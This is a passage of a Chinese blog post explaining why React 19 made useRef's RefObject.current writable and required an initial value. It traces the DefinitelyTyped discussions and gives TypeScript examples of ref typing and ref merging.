.task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">前言</h2>
<p>在 React 19 的更新列表中，<code>useRef</code> 的变化看起来极不起眼：</p>
<ul>
<li><code>useRef()</code> 不再允许无参调用</li>
<li><code>RefObject.current</code> 不再是 <code>readonly</code></li>
<li><code>MutableRefObject</code> 被删除</li>
</ul>
<p>乍一看，这似乎只是一次 TypeScript 类型整理。</p>
<p>但如果你回顾这个改动的来龙去脉，就会发现：<br/>
它实际上是 React 对“引用”这个概念的一次根本性修正。</p>
<h2 data-id="heading-1">回顾：React 18 中 <code>useRef</code> 的类型魔法</h2>
<p>在 React 18 + TypeScript 开发中，你肯定认为下面的代码是很正常的：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> ref = useRef&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">return</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span></span>
)
</code></pre>
<p>这里必须传 <code>null</code>，否则 TypeScript 会报错。<br/>
背后的原因是：<code>useRef</code> 在 React 18 中有一组非常特殊的重载定义：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * React 18 中 useRef 的 3 种 overload
**/</span>
 
<span class="hljs-comment">// ① 传入非 null</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T): <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt;

<span class="hljs-comment">// ② 传入 T | null</span>
<span class="hljs-keyword">function</span> useRef&lt;T&gt;(<span class="hljs-attr">initialValue</span>: T | <span class="hljs-literal">null</span>): <span class="hljs-title class_">RefObject</span>&lt;T&gt;

<span class="hljs-comment">// ③ 什么都不传</span>
<span class="hljs-keyword">function</span> useRef&lt;T = <span class="hljs-literal">undefined</span>&gt;(): <span class="hljs-title class_">MutableRefObject</span>&lt;T | <span class="hljs-literal">undefined</span>&gt;

<span class="hljs-comment">/**
 * 两种 ref 类型
 **/</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">RefObject</span>&lt;T&gt; {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">current</span>: T | <span class="hljs-literal">null</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MutableRefObject</span>&lt;T&gt; {
  <span class="hljs-attr">current</span>: T
}

</code></pre>
<p>TypeScript 会根据<strong>你传入的初始值</strong>来决定：</p>
<ul>
<li><code>useRef(null)</code> → 你在创建一个 JSX ref（只读）</li>
<li><code>useRef(0)</code> → 你在创建一个实例变量（可写）</li>
</ul>
<p>也就是说：<br/>
React 用 <code>null</code> 这个值，去推断一个 ref 的<strong>语义</strong>。</p>
<h3 data-id="heading-2">为什么需要 <code>readonly</code> ？</h3>
<p>这个设计早在 2018 年 12 月就被 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDefinitelyTyped%2FDefinitelyTyped%2Fissues%2F31065" target="_blank" title="https://github.com/DefinitelyTyped/DefinitelyTyped/issues/31065" ref="nofollow noopener noreferrer">一篇 issue</a>  质疑：</p>
<blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbf0d239493944668ba7a849cfc0c5d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=NXHOmjC9GuqqIVuHNpW0u59ZLA4%3D" alt="image.png" loading="lazy"/></p>
<p>现在可以给 ref.current 赋值了，示例参见：<a href="https://link.juejin.cn?target=https%3A%2F%2Freactjs.org%2Fdocs%2Fhooks-faq.html%23is-there-something-like-instance-variables" target="_blank" title="https://reactjs.org/docs/hooks-faq.html#is-there-something-like-instance-variables" ref="nofollow noopener noreferrer">reactjs.org/docs/hooks-…</a></p>
<p>尝试给它赋值时会出现错误：<strong>无法赋值给 'current'</strong>，因为它是<strong>常量</strong>或<strong>只读属性</strong>。</p>
<p>我尝试使用 <code>@types/react</code> 包，但遇到了问题。</p>
</blockquote>
<p>一开始有人指出了是 <code>readonly</code> 导致的只读问题，并考虑是否将其删除。但一名仓库成员 <strong>支持了 <code>readonly</code></strong> 的设计，并做出如下解释：</p>
<blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a947ae2959594e518a4e5bde5e73fc91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=Uuux08L6g3qAS3m9QydxUtHuHTQ%3D" alt="image.png" loading="lazy"/></p>
<p>他认为 <code>readonly</code> 的设计是在确保正确使用 ref，尽管确实 ref 是可写的（没有被冻结）。</p>
<p>当 Hooks 刚出现时，<code>useRef</code> 必须同时承担两种历史角色：</p>

















<table><thead><tr><th>在 class 中</th><th>在 Hooks 中</th></tr></thead><tbody><tr><td><code>this.input = createRef()</code></td><td><code>useRef(null)</code></td></tr><tr><td><code>this.timer = 0</code></td><td><code>useRef(0)</code></td></tr></tbody></table>
<p>他认为应当在类型系统中保留这层区分：</p>
<blockquote>
<p><strong>JSX ref</strong> 是 React 拥有的，理应只读
<strong>普通 ref</strong> 是用户拥有的，所以可写</p>
</blockquote>
<p>这是一个 Rust / C++ 风格的“<strong>指针所有权</strong>”模型，通过这种方式来明确 <code>ref</code> 的所有权，防止意外行为。</p>
</blockquote>
<p>另外他也给出了当时 <strong>想要一个可写 ref</strong> 的解决方案（因为确实有需要<em>初始值为 <code>null</code></em> 的<strong>普通 ref</strong> 的情况），那就是在泛型中添加 <code>| null</code>，此时 TypeScript 会根据 “最具匹配原则”，命中 <code>mutableRefObject</code> 给你。例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> value = useRef&lt;<span class="hljs-built_in">number</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// MutableRefObject</span>
<span class="hljs-keyword">const</span> mutableDom = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// MutableRefObject</span>
</code></pre>
<p>如果你还没理解这个原理，可以通过下面的表格思考：</p>
<blockquote>

















<table><thead><tr><th>overload</th><th>是否匹配</th></tr></thead><tbody><tr><td><code>useRef&lt;T&gt;(T)</code> → <code>MutableRefObject&lt;T&gt;</code></td><td><code>null</code> ∈ <code>HTMLDivElement</code> ✅</td></tr><tr><td><code>useRef&lt;T&gt;(T | null)</code> → <code>RefObject&lt;T&gt;</code></td><td><code>null</code> ∈ <code>HTMLDivElement | null</code> ✅</td></tr></tbody></table>
<p>因为此时 <code>T</code> 包含了 <code>| null</code>，所以 <code>null</code> 初始值命中了两个重载， 但由于 <code>T</code> 比 <code>T | null</code> 更具体，所以命中了第一个，返回 <code>MutableRefObject</code>。通过这样的方式，可以稳定获得可写的 <code>ref</code>，不管其是 <strong>JSX ref</strong> 还是 <strong>普通 ref</strong> 。</p>
</blockquote>
<p>又有人提出，为何不设置成当 <code>useRef()</code> 的<strong>参数缺省时</strong>当做是对 <strong>JSX 的引用（由 React 管理）</strong>，如果<strong>有初始值</strong>则被当做是一个<strong>实例变量（由用户管理）</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c15f631fef14fcb8be643afc5851abc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=ROnmbazKtJOJlitCf6mBnmT%2FLB8%3D" alt="image.png" loading="lazy"/></p>
<p>这样设计看似语义上更加符合直觉，因为当是个实例变量时，用户一般都会将其进行初始化（提供初始值）。反而不提供意味着可能是 JSX 引用。但这个方案很快也被否定：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39865b15586b4c038f3203c8e93db51a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=g0XpQiNXuZP4xb8SIH51oi9pD1w%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58d4641f246b406796b13ec49c2eb37c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=7wJZTH9ISghx%2F36hjyR%2BkhbmJuU%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4a614d122664cd7b2f4e7d76f6f3aa9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=NB6nF3jQ8zx2YI3j2zBFrDdit%2Bc%3D" alt="image.png" loading="lazy"/></p>
<p>总而言之分为以下几点：</p>
<ul>
<li>
<p><strong><code>ref</code> 在被当成引用时理应被初始化为 <code>null</code></strong>：因为 React 在释放 ref 时（例如，当卸载一个有条件挂载的组件时）会为 ref 设置为 <code>null</code>。如果 useRef 没有传递初始值，它会以 <code>undefined</code> 开始，这样一来，你就不得不给原本只需要考虑 <code>| null</code> 的东西加上 <code>| undefined</code>，不适合类型推导。</p>
</li>
<li>
<p><strong>useRef 始终是可变的且不可为 <code>null</code></strong>：前文提到，如果你需要一个可变的 ref，就一定要给一个含 <code>| null</code> 的联合类型作为泛型。如果你同时给它一个不包含 <code>| null</code> 的泛型参数和一个 <code>null</code> 的初始值才会引发不可用的问题，而这个情况也是不符合常理的，因为你自己就违背了自己设置的泛型 —— 它不应该为 <code>null</code>。</p>
</li>
<li>
<p><strong>useRef 应当必填初始值</strong>：早期 React 文档有使用不带初始值的 <code>useRef</code>，这虽然可以工作但完全不利于类型推导。</p>
<ul>
<li><em>如果这个 ref 作为 JSX 引用</em>，那么上面提到它可能为 <code>null</code>。而缺省的含义为 <code>undefined</code>，所以你还要手动添加一个联合类型 <code>| null</code> 在泛型中。</li>
<li><em>如果这个 ref 作为实例变量</em>，它的初始值就更加重要。</li>
</ul>
</li>
</ul>
<p>另外他也给了一些代码示例来佐证这些观点：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 你应该永远提供初始值，尽管有时文档没有这么做</span>
<span class="hljs-comment">// ref1：这应该被视作一个错误</span>
<span class="hljs-keyword">const</span> ref1 = <span class="hljs-title function_">useRef</span>() <span class="hljs-comment">// $ExpectError</span>
<span class="hljs-comment">// ref2：这是一个可写的 ref，但它只能被赋值为 null（你没有指定泛型，类型推导为 null）</span>
<span class="hljs-keyword">const</span> ref2 = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>)
<span class="hljs-comment">// ref3：这依然是一个可写的 ref，但它只能被赋值为 undefined，原理同上</span>
<span class="hljs-keyword">const</span> ref3 = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">undefined</span>)
<span class="hljs-comment">// ref4：这是一个可写的 ref，类型为 number</span>
<span class="hljs-keyword">const</span> ref4 = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>)
<span class="hljs-comment">// ref5：这是一个可写的 ref，类型为 number | null</span>
<span class="hljs-keyword">const</span> ref5 = useRef&lt;<span class="hljs-built_in">number</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
<span class="hljs-comment">// ref6：这是一个可写的 ref，类型是一个对象</span>
<span class="hljs-keyword">const</span> ref6 = useRef&lt;<span class="hljs-title class_">React</span>.<span class="hljs-property">CSSProperties</span>&gt;({})
<span class="hljs-comment">// ref7：这是一个可写的 ref，类型为一个 JSX 引用或 null</span>
<span class="hljs-keyword">const</span> ref7 = useRef&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
<span class="hljs-comment">// ref8：这是唯一一个 ref 只读的例子</span>
<span class="hljs-comment">// 你没有在泛型参数中说明你希望能够向其中写入 null，却还是传入了一个 null。  </span>
<span class="hljs-comment">// 我认为这表明该引用旨在用作元素引用（即由 React 拥有，你只是共享它）</span>
<span class="hljs-keyword">const</span> ref8 = useRef&lt;<span class="hljs-title class_">HTMLElement</span>&gt;(<span class="hljs-literal">null</span>)
<span class="hljs-comment">// ref9：这也不应该被允许，因为你没有在泛型里写到它可能是一个 undefined</span>
<span class="hljs-comment">// 这本质上就是如果我们允许不带参数的 useRef 会发生的情况  </span>
<span class="hljs-comment">// 更糟糕的是，你不能把它用作元素的 ref，因为 React 可能无论如何都会往里面写入一个 null。</span>
<span class="hljs-keyword">const</span> ref9 = useRef&lt;<span class="hljs-title class_">HTMLElement</span>&gt;(<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// $ExpectError</span>
</code></pre>
<p>其实到这里我已经被说服了，这个 <code>readonly</code> 设计可谓非常优雅且理性。因此在 2019 年 5 月，大家决定不对这个类型定义做出修改。</p>
<h2 data-id="heading-3">转折：<code>readonly</code> 真的守护了我们吗？</h2>
<p>依旧是上面谈论的那篇 issue。尽管人们终止了讨论，但有一位开发者提出了他的场景：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCombinedRefs = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">...refs: Ref&lt;T&gt;[]</span>) =&gt;</span>
    <span class="hljs-title function_">useCallback</span>(
        <span class="hljs-function">(<span class="hljs-params">element: T</span>) =&gt;</span>
            refs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">ref</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (!ref) {
                    <span class="hljs-keyword">return</span>;
                }

                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ref === <span class="hljs-string">'function'</span>) {
                    <span class="hljs-title function_">ref</span>(element);
                } <span class="hljs-keyword">else</span> {
                    ref.<span class="hljs-property">current</span> = element; <span class="hljs-comment">// this line produces error</span>
                }
            }),
        refs,
    );
</code></pre>
<p>这个函数的作用是将多个 ref 合并成一个 <code>ref callback</code>，从而让一个 组件/JSX 同时写入多个 ref。</p>
<p>这个场景是有价值的，因为在一些场景中，你可能需要使用 <code>forwardRef</code> 将一个 JSX 暴露给父组件，但自己也想拥有这个 JSX 的 ref：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> ref1 = useRef&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> ref2 = someForwardedRef;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{useCombinedRefs(ref1,</span> <span class="hljs-attr">ref2</span>)} /&gt;</span></span>
</code></pre>
<p>这段代码的逻辑在很多组件库（Radix UI、MUI ...）都是核心基础设施。但很遗憾，就如此常用的用法，在上面看似<strong>为你好</strong>的 <code>readonly</code> 方案中会报错。因为你无法保证外部传来的 ref 是可写的，而且你也不能要求所有调用方都写成 <code>useRef&lt;HTMLElement | null&gt;(null)</code>。</p>
<p>人们被逼无奈要写一个类型断言来规避问题：</p>
<pre><code class="hljs language-ts" lang="ts">(ref <span class="hljs-keyword">as</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">MutableRefObject</span>&lt;T | <span class="hljs-literal">null</span>&gt;).<span class="hljs-property">current</span> = element;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d7c0fa1568b4bc491ccc9d04ba259b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=wtieev3NouqcnozB9JG7hCavkfA%3D" alt="image.png" loading="lazy"/></p>
<p>但仅因发现这一个问题，人们依旧没有意识到这个设计有问题，所以选择自适应。</p>
<p>直到 2023 年 5 月，<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmattpocockuk%2Fstatus%2F1636098722982404096" target="_blank" title="https://x.com/mattpocockuk/status/1636098722982404096" ref="nofollow noopener noreferrer">一篇推文</a>又把这个议题拉入大众视野：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/820207669fa3473e884355b976f796ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGlra29v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295062&amp;x-signature=lHYITkI4HpkUa%2B4WlWmTqdHw7Ds%3D" alt="image.png" loading="lazy"/></p>
<p>随之当天创建了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDefinitelyTyped%2FDefinitelyTyped%2Fpull%2F64772" target="_blank" title="https://github.com/DefinitelyTyped/DefinitelyTyped/pull/64772" ref="nofollow noopener noreferrer">Pull Request</a>，并开启了二度讨论。</p>
<p>Matt 的那条推文并没有提出一个新 bug。<br/>
它真正做的事情是把一个<strong>已经被生态长期用类型断言绕过的问题</strong>，公开化、显性化。</p>
<p>在那条推文下，最典型的反应不是“这是 bug”，而是：</p>
<blockquote>
<p>“这不是设计如此吗？你可以用 <code>| null</code> 解决。”</p>
</blockquote>
<p>这正是 2018 年那套 ownership 模型的遗产。</p>
<p>但这一次不同的地方在于：<br/>
<strong>React 自己已经进入了一个“ref 会被反复重写”的时代。</strong></p>
<ul>
<li>StrictMode 下的 mount → unmount → mount</li>
<li>Suspense / Offscreen 的 detach → attach</li>
<li>Streaming hydration</li>
<li>Server Components 的 DOM 复用</li>
<li>forwardRef 与 imperativeHandle 的广泛使用</li>
<li>...</li>
</ul>
<p>而这些写入，<strong>一半来自 React，一半来自于开发者</strong>。所以这更加意味着 <strong>JSX ref 不应是 React 独占管理的内容</strong>。</p>
<p>正是因为这样，“<strong>让所有 ref 可写</strong>” 变成了 RFC 项目。始于 18 年的话题终在 23 年再次深入讨论并计划于 React 19 上线。</p>
<p>在另一篇讨论 <strong>到底是删除 RefObject 还是删除 MutableRefObject</strong> 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDefinitelyTyped%2FDefinitelyTyped%2Fpull%2F64896" target="_blank" title="https://github.com/DefinitelyTyped/DefinitelyTyped/pull/64896" ref="nofollow noopener noreferrer">Pull Request</a> 中，对这个历史问题留下了总结：</p>
<blockquote>
<p><code>RefObject</code> 这个类型来自 <code>createRef</code>（class 时代），<br/>
但我们错误地把它套在了 <code>useRef</code> 上。<br/>
function 组件里的 ref 从来就不是 React 独占的。</p>
</blockquote>
<p>最后他们选择了删除 <code>MutableRefObject</code>，并为 <code>RefObject</code> 正名 —— ref 就是可写的。</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-interface RefObject&lt;T&gt; {</span>
<span class="hljs-deletion">-  readonly current: T | null</span>
<span class="hljs-deletion">-}</span>
<span class="hljs-addition">+interface RefObject&lt;T&gt; {</span>
<span class="hljs-addition">+  current: T</span>
<span class="hljs-addition">+}</span>
</code></pre>
<h2 data-id="heading-4"><code>ref</code> 类型纠正背后的意义</h2>
<p>这一改动不仅是减少了几行类型定义代码，它标志着 React 团队在<strong>API 设计哲学</strong>和<strong>开发体验</strong>之间做出的重要权衡。</p>
<h3 data-id="heading-5">1. 心智模型的回归：从“所有权”到“容器”</h3>
<p>React 18 的类型系统试图通过 <code>readonly</code> 强加一种<strong>Rust/C++ 风格的“指针所有权”模型</strong>：</p>
<ul>
<li><strong>只读 Ref</strong>：意味着“React 拥有这个 DOM，你只能看”。</li>
<li><strong>可变 Ref</strong>：意味着“这是你的变量，你可以随便改”。</li>
</ul>
<p>但这违背了 JavaScript 开发者的直觉。在 JS 中，对象默认就是可变的。<code>useRef</code> 在本质上只是一个在重渲染之间保持引用的<strong>容器</strong> 。</p>
<p>React 19 放弃了这种人为的“类型洁癖”，承认了 <code>useRef</code> 的本质：<strong>它就是一个 <code>{ current: ... }</code> 对象</strong>。无论里面放的是 DOM 节点还是普通数据，它在物理上都是可写的。</p>
<blockquote>
<p><strong>变化前</strong>：开发者需要根据“是否传入 null”来揣摩类型推导的规则。</p>
<p><strong>变化后</strong>：<code>useRef</code> 就是一个储物柜，钥匙一直在你手里。</p>
</blockquote>
<h3 data-id="heading-6">2. 承认现实：DOM 引用是“共享状态”而非“独占状态”</h3>
<p>正如前文提到的 <code>useCombinedRefs</code> 案例，以及 React 生态中大量存在的 <code>forwardRef</code> 场景，现实中的 DOM 引用往往是<strong>多方协作</strong>的结果：</p>
<ol>
<li>React 在 commit 阶段写入 DOM。</li>
<li>父组件可能需要通过 callback ref 劫持这个 DOM。</li>
<li>第三方库（如动画库、拖拽库）可能直接操作这个 DOM。</li>
</ol>
<p>旧的 <code>RefObject</code> 试图假装 DOM 引用是静态的、由 React 独占的，这是一种 <strong>“虚假的安全感”</strong>。React 19 的改动承认了 <strong>Ref 是组件与其外部环境（DOM、Web API、第三方库）之间的共享可变状态</strong>。</p>
<h3 data-id="heading-7">3. 给 React 19 的其它新特性铺路</h3>
<p>如果把 React 19 的 ref 相关变化放在一起看，你会发现 <code>useRef</code> 的类型更新并不是孤立事件，而是一个“让所有 ref 行为在类型层面自洽”的基础设施升级。</p>
<h4 data-id="heading-8">1）<code>ref</code> as a prop：ref 开始变成“组件 API”的一部分</h4>
<p>React 19 引入了 <strong>ref 作为函数组件的 prop</strong> 的能力：你可以在组件参数里直接拿到 <code>ref</code>，因此新函数组件不再需要 <code>forwardRef</code> 这层包装，官方也明确表示未来会逐步弃用并移除 <code>forwardRef</code>。 <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19" target="_blank" title="https://react.dev/blog/2024/12/05/react-19" ref="nofollow noopener noreferrer">React</a></p>
<p>一旦 ref 变成普通 prop，生态里最常见的模式会变得更“显性”：</p>
<ul>
<li>组件库 / 业务组件都会更频繁地 <strong>透传 ref</strong></li>
<li>也会更频繁地 <strong>合并多个 ref</strong>（内部自己要用一个 ref，外部也传了 ref）</li>
</ul>
<p>而这恰恰就是 React 18 时代 <code>readonly RefObject</code> 最尴尬的点：<br/>
<strong>你写一个通用的 <code>mergeRefs/useCombinedRefs</code> 工具函数时，根本无法保证外部传入的是“可写 ref”</strong> ，最终只能靠断言/any 解决。</p>
<p>React 19 把所有 <code>RefObject.current</code> 统一为可写，本质上是在为“ref 作为组件 API”扫清障碍：<br/>
ref 不再被类型系统暗示成“只属于 React 的只读视图”，而是一个可以被 React 与用户共同写入的槽位。 <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">React</a></p>
<blockquote>
<p>你可以在文章里点明这一句：<br/>
<strong><code>ref as a prop</code> 让 ref 的流动更频繁，而“所有 ref 可写”让这种流动在类型层面不需要额外的 hack。</strong></p>
</blockquote>
<h4 data-id="heading-9">2）Ref callback 支持 cleanup：ref 的“释放语义”正在变化，TS 必须更严格</h4>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">react.dev/blog/2024/0…</a></p>
</blockquote>
<p>React 19 还引入了一个很容易被忽略但很关键的 ref 行为变化：<strong>ref callback 可以返回 cleanup 函数</strong>，React 会在元素从 DOM 移除时调用这个 cleanup。</p>
<p>并且官方明确说明：如果你返回了 cleanup，React 将不再走“卸载时用 <code>null</code> 再调用一次 ref callback”的旧路径，并且未来会逐步弃用“卸载时传 null”这个行为。</p>
<p>这带来一个直接后果：<strong>TypeScript 必须能区分你返回的到底是 cleanup 还是“你不小心写了隐式返回值”</strong> 。因此升级指南里专门强调：由于 cleanup 的引入，ref callback 返回其它值会被 TS 拒绝，并提供 codemod 来迁移隐式返回。</p>
<p>你会发现这里的主题和 <code>useRef</code> 类型更新是一致的：</p>
<ul>
<li>ref 的能力变强了（callback cleanup）</li>
<li>TS 必须更准确地反映真实行为（避免“看起来能写、其实类型不让写 / 看起来返回了个值、其实不是 cleanup”）</li>
</ul>
<p>而“所有 ref 可写”的统一模型，使 ref 相关 API 在类型层面更一致：<br/>
你不需要再用 <em>“readonly 代表 React 所有”</em> 的旧抽象去解释复杂生命周期。</p>
<h4 data-id="heading-10">3）<code>useRef</code> 必须传初始值：不是“强迫症”，是为了让类型推导停止猜测</h4>
<p>React 19 升级指南里对这一点讲得非常直白：</p>
<ul>
<li><code>useRef</code> 现在<strong>必须传入一个初始值</strong></li>
<li>这会显著简化类型签名，让它行为更像 <code>createContext</code></li>
<li>同时，这也意味着 <strong>所有 ref 都可变</strong>，不会再出现“因为用 null 初始化导致 current 只读”的问题 <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">React</a></li>
</ul>
<p>这里你可以把它写成一个“价值主张”：</p>
<blockquote>
<p>React 18 的类型系统在尝试从 <code>null/非null/无参</code> 推断你的语义（JSX ref vs 实例变量）。<br/>
React 19 选择停止猜测：你必须明确给初始值，类型也就能更稳定、更一致。</p>
</blockquote>
<p>并且官方还给出了迁移策略：React 19 codemod 里就包含 <code>refobject-defaults</code>，专门处理 <code>useRef()</code> 无参的迁移。 <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer">React</a></p>
<h4 data-id="heading-11">4）把这三件事连起来：React 19 的 ref 观念正在从“所有权”走向“共享槽位”</h4>
<p>把 React 19 的三条 ref 相关变化并排看：</p>
<ol>
